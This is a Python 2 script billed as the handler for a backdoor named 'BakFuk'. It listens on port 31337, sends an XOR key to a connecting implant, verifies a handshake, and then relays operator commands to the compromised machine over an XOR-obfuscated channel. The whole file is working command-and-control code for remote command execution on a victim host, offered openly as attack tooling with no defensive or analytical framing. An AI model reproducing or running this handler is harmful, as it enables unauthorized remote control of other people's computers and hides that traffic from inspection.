#!/usr/bin/python
# BakFuk Handler!
# Handler crafted for BakFuk
# Made by Ragnax

import sys
import os
import subprocess
import socket
import time
import random
import binascii

host = '0.0.0.0'
port = 31337


def random_xor_key():
    return ''.join(random.choice("1234567890ABCDEF") for _ in range(8))

def xor_data(xor, data):
    while len(xor) < len(data):
        xor+=xor
    return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xor, data))

def unxor_data(xor, data):
    while len(xor) < len(data):
        xor+=xor
    return "".join(chr(ord(y) ^ ord(x)) for x, y in zip(xor, data))



xor=random_xor_key().decode('hex')
print "[*] XOR Key: %s" % xor
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
print "[~] Listening on %s:%d..." % (host, port)
s.listen(20)
conn,client_addr = s.accept()
print "[!] Client connected! (%s:%d)" % (client_addr[0], client_addr[1])
try:
    print "[*] Sending XOR key..."
    conn.sendall(xor)
    data = conn.recv(1024)
    data = unxor_data(xor, data)
    if data != "fuk?":
        print "[!] WARNING: Backdoor possibly compromised."
        print "[!] Better get the hell out of there..."
        sys.exit(-1)
    conn.sendall(xor_data(xor, "fuk!"))
    print "[+] Ready!"
    while True:
            inp = raw_input(":> ")
            conn.sendall(xor_data(xor, inp))
            d=conn.recv(4096)
            d=unxor_data(xor, d)
            print d
finally:
    conn.close()

s.close()
